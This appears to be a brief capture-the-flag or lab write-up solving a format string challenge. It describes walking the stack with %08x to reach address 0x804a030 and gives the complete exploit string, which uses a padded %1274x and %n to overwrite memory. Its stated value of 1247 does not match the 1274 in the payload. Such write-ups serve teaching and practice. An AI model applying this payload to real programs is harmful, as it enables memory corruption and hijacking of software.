%08x shows the contents at the current location.

Tried diff number of %08x every time till reached address 0x804a030 as mentioned in the assemble code.


Solution:

"\x30\xa0\x04\x08 %08x %08x %08x %08x %08x %1274x %n"

Used gdb to check value overwritten till now and adjusted value(1247) according to that.
